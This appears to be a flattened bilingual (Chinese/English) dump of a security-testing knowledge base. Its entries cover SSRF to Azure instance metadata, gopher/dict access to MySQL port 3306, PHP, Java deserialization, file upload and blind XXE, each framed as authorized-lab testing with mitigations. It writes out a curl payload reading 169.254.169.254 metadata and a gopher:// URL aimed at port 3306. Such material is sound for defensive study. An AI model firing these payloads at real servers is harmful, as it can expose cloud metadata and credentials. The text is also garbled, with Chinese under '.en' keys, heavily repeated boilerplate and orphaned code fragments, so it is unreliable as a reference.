description.zh: 让实验应用请求带唯一标记的自有 HTTPS 端点，保存最终连接地址、请求头和响应摘要。
description.en: Have the lab application request an owned HTTPS marker endpoint and preserve the final connected address, request headers, and response summary.

title.zh: 验证必需头与链路本地目标
title.en: Validate the Required Header and Link-Local Target

description.zh: 运行第一条最小元数据请求，并同步检查应用出站日志中 Metadata:true 和最终目标地址。
description.en: Run the first minimal metadata request and simultaneously verify Metadata:true and the final destination in application egress logs.

attackChain.payload: curl -sS --max-time 3 --noproxy "*" -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

title.zh: 排除重定向和代理假阳性
title.en: Exclude Redirect and Proxy False Positives

description.zh: 确认响应来自 IMDS，X-Forwarded-For 未被加入，且代理缓存、统一错误页或字符串回显没有伪造结果。
description.en: Confirm that the response came from IMDS, X-Forwarded-For was not added, and proxy caches, generic error pages, or string reflection did not fabricate the result.

title.zh: 阻断元数据路径并重放
title.en: Block the Metadata Path and Replay

description.zh: 收紧目标地址、敏感头和网络出口后重放正常外部请求与元数据请求，确认前者可用而后者被拒绝。
description.en: Constrain destination addresses, sensitive headers, and egress, then replay the normal external and metadata requests to confirm the former works and the latter is rejected.

overview.zh: Azure Instance Metadata Service 位于链路本地地址 169.254.169.254，并要求请求包含 Metadata:true。条目验证的是应用是否允许用户输入控制最终目标和敏感请求头，而不是把任意 URL 接受、重定向或一次网络错误当作元数据访问成功。所有样例都限定为低敏感度实例信息。
overview.en: Azure Instance Metadata Service is hosted at link-local 169.254.169.254 and requires Metadata:true. This entry tests whether user input can control both the final destination and a sensitive request header, rather than treating URL acceptance, a redirect, or a network error as successful metadata access. Every sample is limited to lower-sensitivity instance information.

vulnerability.zh: 当服务端取回功能允许访问链路本地地址，且攻击者可以注入或继承 Metadata:true 时，SSRF 才可能读取 IMDS。官方服务拒绝带 X-Forwarded-For 的请求，普通重定向不会自动生成必需头，因此“通过重定向绕过 Metadata 头”不能作为通用结论。
vulnerability.en: 当服务端取回功能允许访问链路本地地址，且攻击者可以注入或继承 Metadata:true 时，SSRF 才可能读取 IMDS。官方服务拒绝带 X-Forwarded-For 的请求，普通重定向不会自动生成必需头，因此“通过重定向绕过 Metadata 头”不能作为通用结论。

exploitation.zh: 先对受控外部标记端点建立正常取回基线，再运行第一条命令或让实验 SSRF 代理复现同等请求。阳性需要应用出站日志显示最终连接到 169.254.169.254、IMDS 返回预期 JSON，并确认请求头确实为 Metadata:true；只保存实例名称、区域和标识等最小字段。
exploitation.en: Establish a normal fetch baseline against a controlled external marker, then run the first command or reproduce the equivalent request through the lab SSRF proxy. A positive result requires outbound logs showing the final connection to 169.254.169.254, the expected IMDS JSON, and an actual Metadata:true header. Preserve only minimal fields such as instance name, region, and identifiers.

mitigation.zh: 在 URL 解析和每次重定向后重新校验 scheme、解析地址、端口与最终连接 IP，阻止链路本地、回环和私网目标；不允许用户控制 Metadata 等敏感头，并在网络层限制工作负载访问 IMDS。应用使用最小权限托管身份并审计异常元数据请求。
mitigation.en: Validate scheme, resolved address, port, and final connected IP after URL parsing and every redirect, blocking link-local, loopback, and private destinations. Do not let users control sensitive headers such as Metadata, restrict workload access to IMDS at the network layer, use least-privilege managed identities, and audit anomalous metadata requests.

name.zh: SSRF 非 HTTP Scheme 边界

description.zh: SSRF 非 HTTP Scheme 边界保留可复现的攻击样例与绕过变体，仅修正已确认失效、占位或事实混淆的内容。所有样例只用于可回滚的授权实验，并要求浏览器、解析器、代理或服务端日志与可见结果一致。
description.en: SSRF Non-HTTP Scheme Boundary preserves reproducible attack samples and bypass variants while correcting only confirmed obsolete, placeholder, or factually conflated content. Every sample is restricted to a reversible authorized lab and requires browser, parser, proxy, or server logs to agree with the visible result.

subCategory.zh: SSRF 非 HTTP Scheme 边界

prerequisites.zh: 确认 SSRF 非 HTTP Scheme 边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Non-HTTP Scheme Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

title.zh: SSRF 非 HTTP Scheme 边界清理后命令 1

overview.zh: SSRF 非 HTTP Scheme 边界聚焦以下边界：验证取回器是否错误允许 file、dict、gopher 或 LDAP 等非业务协议连接受控夹具。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: SSRF Non-HTTP Scheme Boundary focuses on this boundary: Tests whether a fetcher improperly permits non-business schemes such as file, dict, gopher, or LDAP against controlled fixtures. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。
vulnerability.en: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。

exploitation.zh: 先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。
exploitation.en: First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.

mitigation.zh: 只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。
mitigation.en: Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。
description.en: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: SSRF Dict 端口边界验证聚焦以下边界：使用隔离监听器确认 dict scheme 和目标端口是否可达，不把服务横幅或错误解释为命令执行。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: SSRF Dict Port-Boundary Validation focuses on this boundary: Uses an isolated listener to test dict scheme and port reachability without interpreting a banner or error as command execution. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。
vulnerability.en: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。

exploitation.zh: 先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。
exploitation.en: First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.

mitigation.zh: 只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。
mitigation.en: Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。
description.en: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: SSRF 地址规范化回归聚焦以下边界：对等价地址、用户信息、IPv6 和重定向执行统一解析后分类，不维护可直接用于真实内网的绕过清单。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: SSRF Address Canonicalization Regression focuses on this boundary: Applies one post-resolution classification to equivalent addresses, userinfo, IPv6, and redirects rather than maintaining a bypass list for real internal networks. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。
vulnerability.en: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。

exploitation.zh: 先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。
exploitation.en: First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.

mitigation.zh: 只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。
mitigation.en: Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.

exploitation.zh: 先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。
exploitation.en: First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.

mitigation.zh: 只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。
mitigation.en: Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.

name.zh: MySQL 端口 SSRF 可达性验证

description.zh: 使用隔离实验 MySQL 监听器和无害标记验证服务端取回器能否把非 HTTP scheme 连接到 3306；不构造认证报文、不执行 SQL，也不写入文件。
description.en: 使用隔离实验 MySQL 监听器和无害标记验证服务端取回器能否把非 HTTP scheme 连接到 3306；不构造认证报文、不执行 SQL，也不写入文件。

subCategory.zh: 非 HTTP Scheme 与 MySQL 可达性

prerequisites.zh: 目标必须是无业务数据、无生产凭据的隔离 MySQL 协议夹具或仅记录字节的 TCP 监听器。
prerequisites.en: The target must be an isolated MySQL protocol fixture or byte-recording TCP listener with no business data or production credentials.

prerequisites.zh: 使用固定 LAB_MYSQL_HOST、短超时和唯一标记；禁止空密码尝试、认证报文生成、SQL 语句和文件写入。
prerequisites.en: Use a fixed LAB_MYSQL_HOST, short timeout, and unique marker; prohibit empty-password attempts, authentication-packet generation, SQL statements, and file writes.

title.zh: 发送 Gopher 无害标记

description.zh: 让实验取回器向固定的字节记录监听器发送唯一文本标记，只验证 scheme 与端口可达性。
description.en: Have the lab fetcher send one unique text marker to a fixed byte-recording listener, validating only scheme and port reachability.

title.zh: 验证 dict Scheme 端口边界
title.en: Validate the dict Scheme Port Boundary

description.zh: 使用同一隔离监听器测试 dict scheme 是否被允许连接 3306，不把返回字节解释为数据库响应。
description.en: Use the same isolated listener to test whether the dict scheme can connect to port 3306 without interpreting returned bytes as a database response.

title.zh: 通过实验取回接口提交 Gopher URL
title.en: Submit a Gopher URL Through the Lab Fetch Endpoint

description.zh: 向专用实验取回接口提交编码后的固定主机 URL，保存结果和出站日志，不生成 MySQL 报文。
description.en: Submit an encoded fixed-host URL to the dedicated lab fetch endpoint and preserve the result plus egress logs without generating MySQL packets.

title.zh: 通过实验取回接口提交 dict URL
title.en: Submit a dict URL Through the Lab Fetch Endpoint

description.zh: 以相同固定主机和唯一标记复测另一非 HTTP scheme，比较拒绝策略和最终连接证据。
description.en: Retest another non-HTTP scheme with the same fixed host and unique marker, comparing rejection behavior and final-connection evidence.

analysis.zh: 阳性证据仅表示应用进程连接了固定实验主机的 3306 端口，并由监听器记录唯一标记或连接。MySQL 握手、错误横幅、连接重置、超时、空密码假设或占位协议字符串都不能证明认证成功或 SQL 被执行。
analysis.en: Positive evidence means only that the application process connected to port 3306 on the fixed lab host and the listener recorded a unique marker or connection. A MySQL handshake, error banner, reset, timeout, empty-password assumption, or protocol placeholder does not prove authentication or SQL execution.

opsecTips.zh: 目标监听器不得连接生产数据库、保存业务数据或接受真实账号凭据。
opsecTips.en: The target listener must not connect to a production database, store business data, or accept real account credentials.

opsecTips.zh: 出现认证提示、SQL 解析日志或非实验地址连接时立即停止并关闭取回器。
opsecTips.en: Stop and shut down the fetcher if authentication prompts, SQL parser logs, or a connection to a non-lab address appears.

title.zh: 复测非 HTTP Scheme 与数据库出口阻断
title.en: Retest Non-HTTP Scheme and Database Egress Blocking

description.zh: 修复后重放固定实验 URL，确认应用拒绝 gopher 或网络层阻断 3306，同时正常 HTTPS 取回仍可用。
description.en: Replay the fixed lab URL after remediation to confirm that the application rejects gopher or the network blocks port 3306 while normal HTTPS fetching still works.

title.zh: 建立正常 HTTPS 取回基线
title.en: Establish a Normal HTTPS Fetch Baseline

description.zh: 使用自有标记端点记录取回器进程、DNS、最终连接地址、超时和应用响应映射。
description.en: Use an owned marker endpoint to record the fetcher process, DNS, final connection address, timeout, and application response mapping.

title.zh: 提交无害 Gopher 标记

description.zh: 运行第一条样例并在隔离监听器查找唯一文本标记，只确认非 HTTP scheme 到 3306 的可达性。
description.en: Run the first sample and look for the unique text marker on the isolated listener, confirming only non-HTTP reachability to port 3306.

attackChain.payload: gopher://{LAB_MYSQL_HOST}:3306/_PAYLOADER_MYSQL_REACHABILITY%0D%0A

title.zh: 区分连接、握手与 SQL 执行
title.en: Separate Connection, Handshake, and SQL Execution

description.zh: 把 TCP 连接、MySQL 服务端握手、客户端认证和 SQL 命令视为四个独立阶段；本条目只确认第一阶段。
description.en: Treat TCP connection, the server handshake, client authentication, and SQL commands as four separate stages; this entry confirms only the first.

title.zh: 限制 Scheme 与数据库出口后回归
title.en: Regress After Scheme and Database Egress Restrictions

description.zh: 只允许 http/https 并阻断数据库网段后重放 gopher、dict 和正常 HTTPS 对照，确认边界准确。
description.en: Allow only http and https and block database-network egress, then replay gopher, dict, and normal HTTPS controls to confirm the boundary precisely.

overview.zh: MySQL 使用服务端先发送握手包的有状态二进制协议。gopher 或 dict URL 能否让取回器建立到 3306 的 TCP 连接，只能证明非 HTTP scheme 与网络可达性，不能证明完成 MySQL 握手、认证或执行 SQL。本条目因此改为受控端口边界验证。
overview.en: MySQL uses a stateful binary protocol in which the server sends the handshake first. A gopher or dict URL that causes a fetcher to connect to port 3306 proves only non-HTTP scheme handling and network reachability; it does not prove completion of the MySQL handshake, authentication, or SQL execution. This entry is therefore scoped to a controlled port-boundary validation.

vulnerability.zh: 风险根因是服务端取回器允许不受信输入选择 gopher、dict 等 scheme，并能连接回环、私网或任意端口。MySQL 的挑战响应认证、能力协商和包序号使固定占位字符串不可能成为通用可执行载荷；“空密码即可执行 SQL”也必须由真实数据库认证证据单独证明。
vulnerability.en: 风险根因是服务端取回器允许不受信输入选择 gopher、dict 等 scheme，并能连接回环、私网或任意端口。MySQL 的挑战响应认证、能力协商和包序号使固定占位字符串不可能成为通用可执行载荷；“空密码即可执行 SQL”也必须由真实数据库认证证据单独证明。

exploitation.zh: 先让实验取回器访问正常 HTTPS 标记端点，再分别提交 gopher 和 dict 的固定实验主机 URL。阳性只记录取回器最终连接到 LAB_MYSQL_HOST:3306、监听器收到唯一标记或连接事件，以及应用返回的可控错误差异。不要把握手字节、连接重置或超时解释为 SQL 执行。
exploitation.en: First have the lab fetcher access a normal HTTPS marker endpoint, then submit gopher and dict URLs for the fixed lab host. Record only that the fetcher connected to LAB_MYSQL_HOST:3306, that the listener observed the unique marker or connection event, and that the application produced a controlled error difference. Do not interpret handshake bytes, connection reset, or timeout as SQL execution.

mitigation.zh: 只允许业务必需的 http/https scheme，解析后及每次重定向都阻止回环、链路本地和私网地址，并限制允许端口；在网络层禁止 Web 工作负载访问数据库网段。MySQL 继续要求强认证、最小账号权限和受信绑定，但数据库加固不能替代 SSRF 出站控制。
mitigation.en: Allow only business-required http and https schemes, block loopback, link-local, and private addresses after resolution and every redirect, and allowlist ports. Prevent web workloads from reaching database networks at the network layer. MySQL should still require strong authentication, least-privilege accounts, and trusted binding, but database hardening does not replace SSRF egress controls.

overview.zh: PHP 动态执行边界验证聚焦以下边界：在专用 PHP 夹具中只输出固定标记，区分字符串回显、模板插值和真正的服务端代码求值。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: PHP 动态执行边界验证聚焦以下边界：在专用 PHP 夹具中只输出固定标记，区分字符串回显、模板插值和真正的服务端代码求值。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。
vulnerability.en: Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.

exploitation.zh: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。
exploitation.en: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。

mitigation.zh: 移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。
mitigation.en: Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.

overview.zh: PHP Filter 受控资源边界聚焦以下边界：只对沙箱标记文件验证 php://filter 解析，禁止构造动态代码链或读取应用源码。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: PHP Filter Controlled-Resource Boundary focuses on this boundary: Validates php://filter only against a sandbox marker file and prohibits dynamic code chains or application-source reads. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。
vulnerability.en: Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.

exploitation.zh: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。
exploitation.en: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。

mitigation.zh: 移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。
mitigation.en: Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.

class Chain {

?>

overview.zh: Java 反序列化类型边界聚焦以下边界：使用本地测试 DTO 验证 ObjectInputFilter 和允许类型，不分发 ysoserial 链或加载远程类。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Java Deserialization Type Boundary focuses on this boundary: Uses a local test DTO to validate Object Input Filter and allowed types without distributing ysoserial chains or loading remote classes. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。
vulnerability.en: Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.

exploitation.zh: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。

mitigation.zh: 移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。
mitigation.en: Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.

overview.zh: 安全的文件上传链路必须把用户提供的文件名和 MIME 视为不可信提示，再通过服务端生成存储名、完整内容解析、大小限制和不可执行存储建立边界。本条目按正常文本、双扩展、替代扩展、声明与检测 MIME 不一致、内容结构不完整和配置文件名六类变量逐项验证。
overview.en: A secure upload pipeline treats user filenames and MIME as untrusted hints, then enforces server-generated storage names, complete content parsing, size limits, and non-executable storage. This entry tests normal text, double extensions, alternative extensions, declared-versus-detected MIME mismatches, incomplete content structures, and configuration filenames as separate variables.

vulnerability.zh: 上传返回成功或保留危险扩展名不等于远程代码执行。确认问题至少要证明对象落入 Web 可达且启用脚本处理器的位置，并由无副作用服务器端 marker 证明处理器解释；静态下载、强制 attachment、随机重命名、解码失败或处理器禁用都是阻断证据。
vulnerability.en: An accepted upload or retained dangerous extension does not equal remote code execution. Confirmation requires the object to reach a web-accessible location with a script handler and a side-effect-free server marker to prove interpretation. Static download, forced attachment, random renaming, decode failure, or disabled handlers are blocking evidence.

exploitation.zh: 先上传纯文本 marker 建立正常存储基线，再逐个提交双扩展、替代扩展、伪造声明 MIME、魔数与扩展冲突以及 .htaccess 文件名。每次使用唯一 request_id，记录原始名、最终名、声明与检测类型、内容解码结果、存储路径类别和 executable 布尔值；不上传任何脚本代码。
exploitation.en: First upload a plain-text marker to establish normal storage behavior, then submit double extensions, alternative extensions, a forged declared MIME, magic-versus-extension mismatches, and a .htaccess filename one at a time. Use a unique request_id and record raw and stored names, declared and detected types, decode result, storage class, and executable boolean without uploading script code.

mitigation.zh: 在服务端对允许的业务文件类型执行严格允许列表和完整解码，使用随机对象名并把对象存储在 Web 根之外；下载时设置安全 Content-Type 与 Content-Disposition。禁用上传目录脚本处理器和 .htaccess 覆盖，限制大小与数量，并对恶意软件和压缩包执行独立扫描。
mitigation.en: 在服务端对允许的业务文件类型执行严格允许列表和完整解码，使用随机对象名并把对象存储在 Web 根之外；下载时设置安全 Content-Type 与 Content-Disposition。禁用上传目录脚本处理器和 .htaccess 覆盖，限制大小与数量，并对恶意软件和压缩包执行独立扫描。

overview.zh: 服务端文件包含沙箱边界聚焦以下边界：只包含沙箱中的静态标记模板，确认规范化路径和允许模板 ID 是否限制实际文件。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: 服务端文件包含沙箱边界聚焦以下边界：只包含沙箱中的静态标记模板，确认规范化路径和允许模板 ID 是否限制实际文件。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。
vulnerability.en: Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.

exploitation.zh: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。
exploitation.en: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。

mitigation.zh: 移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。
mitigation.en: Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.

overview.zh: 图片元数据执行边界聚焦以下边界：在固定测试图片中写入纯文本元数据，确认上传和处理链是否把元数据交给命令或模板解释器。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: 图片元数据执行边界聚焦以下边界：在固定测试图片中写入纯文本元数据，确认上传和处理链是否把元数据交给命令或模板解释器。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。
vulnerability.en: Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.

exploitation.zh: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。
exploitation.en: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。

mitigation.zh: 移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。
mitigation.en: Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.

overview.zh: 无回显 XXE 关联验证聚焦以下边界：用唯一 DNS/HTTPS 标记关联解析器出站请求，要求服务日志与 OAST 时间戳同时成立。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: Blind XXE Correlation Validation focuses on this boundary: Uses a unique DNS or HTTPS marker to correlate parser egress, requiring both service logs and OAST timestamps. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

